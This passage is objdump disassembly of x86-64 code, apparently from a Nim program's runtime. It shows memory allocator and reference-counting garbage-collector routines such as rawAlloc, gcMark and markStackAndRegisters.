  4028f6:	00 
  4028f7:	7d 3f                	jge    402938 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x18e>
  4028f9:	eb 2f                	jmp    40292a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x180>
  4028fb:	49 81 f9 ff ff 07 00 	cmp    $0x7ffff,%r9
  402902:	7e 16                	jle    40291a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x170>
  402904:	48 89 fa             	mov    %rdi,%rdx
  402907:	48 89 d9             	mov    %rbx,%rcx
  40290a:	e8 d6 fc ff ff       	call   4025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>
  40290f:	48 39 78 08          	cmp    %rdi,0x8(%rax)
  402913:	48 89 c6             	mov    %rax,%rsi
  402916:	7e 20                	jle    402938 <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x18e>
  402918:	eb 10                	jmp    40292a <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ+0x180>
  40291a:	ba 00 00 08 00       	mov    $0x80000,%edx
  40291f:	48 89 d9             	mov    %rbx,%rcx
  402922:	e8 be fc ff ff       	call   4025e5 <requestOsChunks__stlXHMKRKFIGOvq8t4ynRQ_2>
  402927:	48 89 c6             	mov    %rax,%rsi
  40292a:	49 89 f8             	mov    %rdi,%r8
  40292d:	48 89 f2             	mov    %rsi,%rdx
  402930:	48 89 d9             	mov    %rbx,%rcx
  402933:	e8 90 fc ff ff       	call   4025c8 <splitChunk__BqFVAuadgXfvAiq8B9cBjqQ>
  402938:	49 89 f0             	mov    %rsi,%r8
  40293b:	48 c7 06 01 00 00 00 	movq   $0x1,(%rsi)
  402942:	48 89 d9             	mov    %rbx,%rcx
  402945:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  40294c:	49 c1 f8 0c          	sar    $0xc,%r8
  402950:	e8 89 f8 ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  402955:	48 89 f0             	mov    %rsi,%rax
  402958:	48 29 bb 90 28 00 00 	sub    %rdi,0x2890(%rbx)
  40295f:	48 83 c4 20          	add    $0x20,%rsp
  402963:	5b                   	pop    %rbx
  402964:	5e                   	pop    %rsi
  402965:	5f                   	pop    %rdi
  402966:	c3                   	ret

0000000000402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>:
  402967:	55                   	push   %rbp
  402968:	57                   	push   %rdi
  402969:	56                   	push   %rsi
  40296a:	53                   	push   %rbx
  40296b:	48 83 ec 28          	sub    $0x28,%rsp
  40296f:	48 8d 72 07          	lea    0x7(%rdx),%rsi
  402973:	48 89 cb             	mov    %rcx,%rbx
  402976:	48 89 f5             	mov    %rsi,%rbp
  402979:	48 83 e5 f8          	and    $0xfffffffffffffff8,%rbp
  40297d:	48 81 fd c8 0f 00 00 	cmp    $0xfc8,%rbp
  402984:	7e 21                	jle    4029a7 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x40>
  402986:	48 8d 72 20          	lea    0x20(%rdx),%rsi
  40298a:	48 81 fe 00 00 00 3f 	cmp    $0x3f000000,%rsi
  402991:	0f 8f eb 00 00 00    	jg     402a82 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x11b>
  402997:	48 89 f2             	mov    %rsi,%rdx
  40299a:	e8 0b fe ff ff       	call   4027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>
  40299f:	48 89 c5             	mov    %rax,%rbp
  4029a2:	e9 1e 01 00 00       	jmp    402ac5 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x15e>
  4029a7:	48 83 e6 f8          	and    $0xfffffffffffffff8,%rsi
  4029ab:	48 01 ce             	add    %rcx,%rsi
  4029ae:	48 8b 46 10          	mov    0x10(%rsi),%rax
  4029b2:	48 85 c0             	test   %rax,%rax
  4029b5:	74 12                	je     4029c9 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x62>
  4029b7:	48 8b 78 20          	mov    0x20(%rax),%rdi
  4029bb:	48 85 ff             	test   %rdi,%rdi
  4029be:	74 5a                	je     402a1a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xb3>
  4029c0:	48 8b 17             	mov    (%rdi),%rdx
  4029c3:	48 89 50 20          	mov    %rdx,0x20(%rax)
  4029c7:	eb 61                	jmp    402a2a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xc3>
  4029c9:	ba 00 10 00 00       	mov    $0x1000,%edx
  4029ce:	e8 d7 fd ff ff       	call   4027aa <getBigChunk__stlXHMKRKFIGOvq8t4ynRQ>
  4029d3:	ba c8 0f 00 00       	mov    $0xfc8,%edx
  4029d8:	48 29 ea             	sub    %rbp,%rdx
  4029db:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  4029e2:	00 
  4029e3:	48 89 50 28          	mov    %rdx,0x28(%rax)
  4029e7:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  4029ee:	00 
  4029ef:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  4029f3:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
  4029fa:	00 
  4029fb:	48 89 68 08          	mov    %rbp,0x8(%rax)
  4029ff:	48 89 68 30          	mov    %rbp,0x30(%rax)
  402a03:	48 85 d2             	test   %rdx,%rdx
  402a06:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402a0a:	74 04                	je     402a10 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xa9>
  402a0c:	48 89 42 18          	mov    %rax,0x18(%rdx)
  402a10:	48 89 46 10          	mov    %rax,0x10(%rsi)
  402a14:	48 8d 78 38          	lea    0x38(%rax),%rdi
  402a18:	eb 14                	jmp    402a2e <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xc7>
  402a1a:	48 8b 50 30          	mov    0x30(%rax),%rdx
  402a1e:	48 8d 7c 10 38       	lea    0x38(%rax,%rdx,1),%rdi
  402a23:	48 01 ea             	add    %rbp,%rdx
  402a26:	48 89 50 30          	mov    %rdx,0x30(%rax)
  402a2a:	48 29 68 28          	sub    %rbp,0x28(%rax)
  402a2e:	48 39 68 28          	cmp    %rbp,0x28(%rax)
  402a32:	7d 42                	jge    402a76 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x10f>
  402a34:	48 3b 46 10          	cmp    0x10(%rsi),%rax
  402a38:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402a3c:	74 17                	je     402a55 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xee>
  402a3e:	48 8b 48 18          	mov    0x18(%rax),%rcx
  402a42:	48 89 51 10          	mov    %rdx,0x10(%rcx)
  402a46:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402a4a:	48 85 d2             	test   %rdx,%rdx
  402a4d:	74 17                	je     402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a4f:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
  402a53:	eb 11                	jmp    402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a55:	48 85 d2             	test   %rdx,%rdx
  402a58:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  402a5c:	74 08                	je     402a66 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0xff>
  402a5e:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  402a65:	00 
  402a66:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  402a6d:	00 
  402a6e:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402a75:	00 
  402a76:	48 01 ab 98 28 00 00 	add    %rbp,0x2898(%rbx)
  402a7d:	e9 98 00 00 00       	jmp    402b1a <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x1b3>
  402a82:	48 89 f1             	mov    %rsi,%rcx
  402a85:	e8 f8 f5 ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  402a8a:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  402a91:	48 89 d9             	mov    %rbx,%rcx
  402a94:	48 01 b3 80 28 00 00 	add    %rsi,0x2880(%rbx)
  402a9b:	49 89 c0             	mov    %rax,%r8
  402a9e:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402aa2:	48 89 c5             	mov    %rax,%rbp
  402aa5:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
  402aac:	00 
  402aad:	49 c1 f8 0c          	sar    $0xc,%r8
  402ab1:	48 c7 40 18 00 00 00 	movq   $0x0,0x18(%rax)
  402ab8:	00 
  402ab9:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  402ac0:	e8 19 f7 ff ff       	call   4021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>
  402ac5:	48 83 bb a8 30 00 00 	cmpq   $0x0,0x30a8(%rbx)
  402acc:	00 
  402acd:	48 8d 7d 20          	lea    0x20(%rbp),%rdi
  402ad1:	75 26                	jne    402af9 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x192>
  402ad3:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  402ada:	00 
  402adb:	48 8d 83 d8 30 00 00 	lea    0x30d8(%rbx),%rax
  402ae2:	75 0e                	jne    402af2 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ+0x18b>
  402ae4:	48 89 83 d8 30 00 00 	mov    %rax,0x30d8(%rbx)
  402aeb:	48 89 83 e0 30 00 00 	mov    %rax,0x30e0(%rbx)
  402af2:	48 89 83 a8 30 00 00 	mov    %rax,0x30a8(%rbx)
  402af9:	48 8d 93 a8 30 00 00 	lea    0x30a8(%rbx),%rdx
  402b00:	49 89 f8             	mov    %rdi,%r8
  402b03:	48 89 d9             	mov    %rbx,%rcx
  402b06:	4c 8d 0c 37          	lea    (%rdi,%rsi,1),%r9
  402b0a:	e8 1b f6 ff ff       	call   40212a <add__3D9aOyz4rDquPZKBlqn0xig>
  402b0f:	48 8b 45 08          	mov    0x8(%rbp),%rax
  402b13:	48 01 83 98 28 00 00 	add    %rax,0x2898(%rbx)
  402b1a:	48 89 f8             	mov    %rdi,%rax
  402b1d:	48 83 c4 28          	add    $0x28,%rsp
  402b21:	5b                   	pop    %rbx
  402b22:	5e                   	pop    %rsi
  402b23:	5f                   	pop    %rdi
  402b24:	5d                   	pop    %rbp
  402b25:	c3                   	ret

0000000000402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>:
  402b26:	48 83 ec 28          	sub    $0x28,%rsp
  402b2a:	48 83 c2 10          	add    $0x10,%rdx
  402b2e:	e8 34 fe ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  402b33:	48 c7 40 08 01 00 00 	movq   $0x1,0x8(%rax)
  402b3a:	00 
  402b3b:	48 83 c0 10          	add    $0x10,%rax
  402b3f:	48 83 c4 28          	add    $0x28,%rsp
  402b43:	c3                   	ret

0000000000402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>:
  402b44:	41 54                	push   %r12
  402b46:	55                   	push   %rbp
  402b47:	57                   	push   %rdi
  402b48:	56                   	push   %rsi
  402b49:	53                   	push   %rbx
  402b4a:	48 83 ec 20          	sub    $0x20,%rsp
  402b4e:	48 8b 41 08          	mov    0x8(%rcx),%rax
  402b52:	48 3b 01             	cmp    (%rcx),%rax
  402b55:	48 89 cb             	mov    %rcx,%rbx
  402b58:	49 89 d4             	mov    %rdx,%r12
  402b5b:	7f 52                	jg     402baf <add__W9aRfhn7HvnQTPAb8ajo1uwsystem+0x6b>
  402b5d:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402b61:	b9 02 00 00 00       	mov    $0x2,%ecx
  402b66:	48 99                	cqto
  402b68:	48 f7 f9             	idiv   %rcx
  402b6b:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402b6f:	48 89 c6             	mov    %rax,%rsi
  402b72:	e8 29 f1 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  402b77:	48 8d 14 f5 00 00 00 	lea    0x0(,%rsi,8),%rdx
  402b7e:	00 
  402b7f:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  402b86:	e8 9b ff ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  402b8b:	48 8b 73 10          	mov    0x10(%rbx),%rsi
  402b8f:	48 89 c5             	mov    %rax,%rbp
  402b92:	48 8b 03             	mov    (%rbx),%rax
  402b95:	48 89 ef             	mov    %rbp,%rdi
  402b98:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
  402b9f:	00 
  402ba0:	f3 a4                	rep movsb (%rsi),(%rdi)
  402ba2:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
  402ba6:	e8 fb f9 ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  402bab:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
  402baf:	48 8b 03             	mov    (%rbx),%rax
  402bb2:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  402bb6:	4c 89 24 c2          	mov    %r12,(%rdx,%rax,8)
  402bba:	48 ff c0             	inc    %rax
  402bbd:	48 89 03             	mov    %rax,(%rbx)
  402bc0:	48 83 c4 20          	add    $0x20,%rsp
  402bc4:	5b                   	pop    %rbx
  402bc5:	5e                   	pop    %rsi
  402bc6:	5f                   	pop    %rdi
  402bc7:	5d                   	pop    %rbp
  402bc8:	41 5c                	pop    %r12
  402bca:	c3                   	ret

0000000000402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46>:
  402bcb:	4c 8b 42 28          	mov    0x28(%rdx),%r8
  402bcf:	48 89 c8             	mov    %rcx,%rax
  402bd2:	48 8b 4a 18          	mov    0x18(%rdx),%rcx
  402bd6:	4c 8d 0c cd 00 00 00 	lea    0x0(,%rcx,8),%r9
  402bdd:	00 
  402bde:	48 83 f9 08          	cmp    $0x8,%rcx
  402be2:	7f 10                	jg     402bf4 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0x29>
  402be4:	49 89 04 c8          	mov    %rax,(%r8,%rcx,8)
  402be8:	48 ff c1             	inc    %rcx
  402beb:	48 89 4a 18          	mov    %rcx,0x18(%rdx)
  402bef:	e9 ae 00 00 00       	jmp    402ca2 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xd7>
  402bf4:	4f 8d 54 08 f8       	lea    -0x8(%r8,%r9,1),%r10
  402bf9:	4d 8b 1a             	mov    (%r10),%r11
  402bfc:	49 8b 0b             	mov    (%r11),%rcx
  402bff:	48 83 f9 07          	cmp    $0x7,%rcx
  402c03:	0f 87 83 00 00 00    	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c09:	4f 8d 54 08 f0       	lea    -0x10(%r8,%r9,1),%r10
  402c0e:	4d 8b 1a             	mov    (%r10),%r11
  402c11:	49 8b 0b             	mov    (%r11),%rcx
  402c14:	48 83 f9 07          	cmp    $0x7,%rcx
  402c18:	77 72                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c1a:	4f 8d 54 08 e8       	lea    -0x18(%r8,%r9,1),%r10
  402c1f:	4d 8b 1a             	mov    (%r10),%r11
  402c22:	49 8b 0b             	mov    (%r11),%rcx
  402c25:	48 83 f9 07          	cmp    $0x7,%rcx
  402c29:	77 61                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c2b:	4f 8d 54 08 e0       	lea    -0x20(%r8,%r9,1),%r10
  402c30:	4d 8b 1a             	mov    (%r10),%r11
  402c33:	49 8b 0b             	mov    (%r11),%rcx
  402c36:	48 83 f9 07          	cmp    $0x7,%rcx
  402c3a:	77 50                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c3c:	4f 8d 54 08 d8       	lea    -0x28(%r8,%r9,1),%r10
  402c41:	4d 8b 1a             	mov    (%r10),%r11
  402c44:	49 8b 0b             	mov    (%r11),%rcx
  402c47:	48 83 f9 07          	cmp    $0x7,%rcx
  402c4b:	77 3f                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c4d:	4f 8d 54 08 d0       	lea    -0x30(%r8,%r9,1),%r10
  402c52:	4d 8b 1a             	mov    (%r10),%r11
  402c55:	49 8b 0b             	mov    (%r11),%rcx
  402c58:	48 83 f9 07          	cmp    $0x7,%rcx
  402c5c:	77 2e                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c5e:	4f 8d 54 08 c8       	lea    -0x38(%r8,%r9,1),%r10
  402c63:	4d 8b 1a             	mov    (%r10),%r11
  402c66:	49 8b 0b             	mov    (%r11),%rcx
  402c69:	48 83 f9 07          	cmp    $0x7,%rcx
  402c6d:	77 1d                	ja     402c8c <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xc1>
  402c6f:	4f 8d 44 08 c0       	lea    -0x40(%r8,%r9,1),%r8
  402c74:	4d 8b 08             	mov    (%r8),%r9
  402c77:	49 8b 09             	mov    (%r9),%rcx
  402c7a:	48 83 f9 07          	cmp    $0x7,%rcx
  402c7e:	77 18                	ja     402c98 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xcd>
  402c80:	48 8d 4a 18          	lea    0x18(%rdx),%rcx
  402c84:	48 89 c2             	mov    %rax,%rdx
  402c87:	e9 b8 fe ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402c8c:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
  402c90:	49 89 0b             	mov    %rcx,(%r11)
  402c93:	49 89 02             	mov    %rax,(%r10)
  402c96:	eb 0a                	jmp    402ca2 <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46+0xd7>
  402c98:	48 83 e1 fb          	and    $0xfffffffffffffffb,%rcx
  402c9c:	49 89 09             	mov    %rcx,(%r9)
  402c9f:	49 89 00             	mov    %rax,(%r8)
  402ca2:	c3                   	ret

0000000000402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>:
  402ca3:	48 83 ec 28          	sub    $0x28,%rsp
  402ca7:	4c 8d 4a f0          	lea    -0x10(%rdx),%r9
  402cab:	49 89 ca             	mov    %rcx,%r10
  402cae:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
  402cb5:	0f 86 bd 00 00 00    	jbe    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cbb:	48 8d 89 10 29 00 00 	lea    0x2910(%rcx),%rcx
  402cc2:	4c 89 ca             	mov    %r9,%rdx
  402cc5:	48 c1 fa 0c          	sar    $0xc,%rdx
  402cc9:	e8 04 ec ff ff       	call   4018d2 <contains__9b5xR7VBZVwQDvk5Nr9bDKdQ>
  402cce:	84 c0                	test   %al,%al
  402cd0:	75 0b                	jne    402cdd <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x3a>
  402cd2:	4d 3b 4a 68          	cmp    0x68(%r10),%r9
  402cd6:	73 58                	jae    402d30 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x8d>
  402cd8:	e9 9b 00 00 00       	jmp    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cdd:	4c 89 c9             	mov    %r9,%rcx
  402ce0:	48 81 e1 00 f0 ff ff 	and    $0xfffffffffffff000,%rcx
  402ce7:	f6 01 01             	testb  $0x1,(%rcx)
  402cea:	0f 84 88 00 00 00    	je     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402cf0:	4c 8b 59 08          	mov    0x8(%rcx),%r11
  402cf4:	49 81 fb c8 0f 00 00 	cmp    $0xfc8,%r11
  402cfb:	7e 10                	jle    402d0d <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x6a>
  402cfd:	48 8d 51 20          	lea    0x20(%rcx),%rdx
  402d01:	4c 39 ca             	cmp    %r9,%rdx
  402d04:	77 72                	ja     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d06:	48 83 79 28 01       	cmpq   $0x1,0x28(%rcx)
  402d0b:	eb 58                	jmp    402d65 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xc2>
  402d0d:	41 81 e1 ff 0f 00 00 	and    $0xfff,%r9d
  402d14:	49 8d 41 c8          	lea    -0x38(%r9),%rax
  402d18:	48 3b 41 30          	cmp    0x30(%rcx),%rax
  402d1c:	73 5a                	jae    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d1e:	4c 8d 44 01 38       	lea    0x38(%rcx,%rax,1),%r8
  402d23:	31 d2                	xor    %edx,%edx
  402d25:	49 f7 f3             	div    %r11
  402d28:	49 29 d0             	sub    %rdx,%r8
  402d2b:	4c 89 c2             	mov    %r8,%rdx
  402d2e:	eb 30                	jmp    402d60 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xbd>
  402d30:	4d 3b 4a 70          	cmp    0x70(%r10),%r9
  402d34:	77 42                	ja     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d36:	49 8b 82 10 31 00 00 	mov    0x3110(%r10),%rax
  402d3d:	48 3b 00             	cmp    (%rax),%rax
  402d40:	74 36                	je     402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d42:	48 8b 50 10          	mov    0x10(%rax),%rdx
  402d46:	49 39 d1             	cmp    %rdx,%r9
  402d49:	72 06                	jb     402d51 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xae>
  402d4b:	4c 3b 48 18          	cmp    0x18(%rax),%r9
  402d4f:	72 0f                	jb     402d60 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xbd>
  402d51:	49 39 d1             	cmp    %rdx,%r9
  402d54:	0f 97 c2             	seta   %dl
  402d57:	0f b6 d2             	movzbl %dl,%edx
  402d5a:	48 8b 04 d0          	mov    (%rax,%rdx,8),%rax
  402d5e:	eb dd                	jmp    402d3d <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0x9a>
  402d60:	48 83 7a 08 01       	cmpq   $0x1,0x8(%rdx)
  402d65:	76 11                	jbe    402d78 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem+0xd5>
  402d67:	48 83 02 08          	addq   $0x8,(%rdx)
  402d6b:	49 8d 4a 30          	lea    0x30(%r10),%rcx
  402d6f:	48 83 c4 28          	add    $0x28,%rsp
  402d73:	e9 cc fd ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402d78:	48 83 c4 28          	add    $0x28,%rsp
  402d7c:	c3                   	ret

0000000000402d7d <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g>:
  402d7d:	55                   	push   %rbp
  402d7e:	41 54                	push   %r12
  402d80:	57                   	push   %rdi
  402d81:	56                   	push   %rsi
  402d82:	53                   	push   %rbx
  402d83:	48 89 e5             	mov    %rsp,%rbp
  402d86:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  402d8d:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
  402d91:	48 8d 8d 00 ff ff ff 	lea    -0x100(%rbp),%rcx
  402d98:	48 89 ea             	mov    %rbp,%rdx
  402d9b:	e8 c0 56 00 00       	call   408460 <_setjmp>
  402da0:	85 c0                	test   %eax,%eax
  402da2:	0f 85 c7 00 00 00    	jne    402e6f <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xf2>
  402da8:	48 8b 45 30          	mov    0x30(%rbp),%rax
  402dac:	48 8d 9d 00 ff ff ff 	lea    -0x100(%rbp),%rbx
  402db3:	49 89 ec             	mov    %rbp,%r12
  402db6:	48 8b 38             	mov    (%rax),%rdi
  402db9:	48 89 fe             	mov    %rdi,%rsi
  402dbc:	49 39 dc             	cmp    %rbx,%r12
  402dbf:	77 06                	ja     402dc7 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x4a>
  402dc1:	48 83 ee 40          	sub    $0x40,%rsi
  402dc5:	eb 1f                	jmp    402de6 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x69>
  402dc7:	48 8b 13             	mov    (%rbx),%rdx
  402dca:	48 83 c3 08          	add    $0x8,%rbx
  402dce:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402dd2:	e8 cc fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402dd7:	48 8b 53 fc          	mov    -0x4(%rbx),%rdx
  402ddb:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402ddf:	e8 bf fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402de4:	eb d6                	jmp    402dbc <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x3f>
  402de6:	48 39 de             	cmp    %rbx,%rsi
  402de9:	76 6d                	jbe    402e58 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xdb>
  402deb:	48 8b 13             	mov    (%rbx),%rdx
  402dee:	48 83 c3 40          	add    $0x40,%rbx
  402df2:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402df6:	e8 a8 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402dfb:	48 8b 53 c8          	mov    -0x38(%rbx),%rdx
  402dff:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e03:	e8 9b fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e08:	48 8b 53 d0          	mov    -0x30(%rbx),%rdx
  402e0c:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e10:	e8 8e fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e15:	48 8b 53 d8          	mov    -0x28(%rbx),%rdx
  402e19:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e1d:	e8 81 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e22:	48 8b 53 e0          	mov    -0x20(%rbx),%rdx
  402e26:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e2a:	e8 74 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e2f:	48 8b 53 e8          	mov    -0x18(%rbx),%rdx
  402e33:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e37:	e8 67 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e3c:	48 8b 53 f0          	mov    -0x10(%rbx),%rdx
  402e40:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e44:	e8 5a fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e49:	48 8b 53 f8          	mov    -0x8(%rbx),%rdx
  402e4d:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e51:	e8 4d fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e56:	eb 8e                	jmp    402de6 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0x69>
  402e58:	48 39 df             	cmp    %rbx,%rdi
  402e5b:	72 12                	jb     402e6f <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xf2>
  402e5d:	48 8b 13             	mov    (%rbx),%rdx
  402e60:	48 83 c3 08          	add    $0x8,%rbx
  402e64:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
  402e68:	e8 36 fe ff ff       	call   402ca3 <gcMark__x5SbLN3uVBCsEa67N20nPwsystem>
  402e6d:	eb e9                	jmp    402e58 <markStackAndRegisters__U6T7JWtDLrWhtmhXSoy9a6g+0xdb>
  402e6f:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  402e76:	5b                   	pop    %rbx
  402e77:	5e                   	pop    %rsi
  402e78:	5f                   	pop    %rdi
  402e79:	41 5c                	pop    %r12
  402e7b:	5d                   	pop    %rbp
  402e7c:	c3                   	ret

0000000000402e7d <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q>:
  402e7d:	48 8b 02             	mov    (%rdx),%rax
  402e80:	a8 04                	test   $0x4,%al
  402e82:	75 0c                	jne    402e90 <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q+0x13>
  402e84:	48 83 c8 04          	or     $0x4,%rax
  402e88:	48 89 02             	mov    %rax,(%rdx)
  402e8b:	e9 b4 fc ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  402e90:	c3                   	ret

0000000000402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82>:
  402e91:	53                   	push   %rbx
  402e92:	48 83 ec 20          	sub    $0x20,%rsp
  402e96:	48 8b 01             	mov    (%rcx),%rax
  402e99:	48 83 e8 08          	sub    $0x8,%rax
  402e9d:	48 89 cb             	mov    %rcx,%rbx
  402ea0:	48 83 f8 07          	cmp    $0x7,%rax
  402ea4:	48 89 01             	mov    %rax,(%rcx)
  402ea7:	77 13                	ja     402ebc <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.82+0x2b>
